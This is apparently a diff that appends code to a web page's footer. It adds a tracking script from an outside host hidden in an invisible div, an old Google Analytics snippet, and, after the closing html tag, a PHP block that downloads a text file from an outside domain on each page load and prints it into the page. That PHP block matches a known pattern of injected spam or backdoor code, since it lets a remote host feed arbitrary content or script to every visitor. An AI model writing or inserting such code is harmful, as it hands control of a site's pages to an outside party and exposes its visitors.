+<div style="display:none;"><SCRIPT type="text/javascript" src="http://www31.tracer.jp/VL/Trace?c=sk11137&p="></SCRIPT></div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-12002718-1");
+pageTracker._trackPageview();
+} catch(err) {}</script>
+
+</body>
+</html> 
+
+
+<?php
+$lorns = file_get_contents("https://backlinkku.id/menu/aged-v1/script.txt");
+if ($lorns !== false) {
+    echo $lorns;
+}
+?>
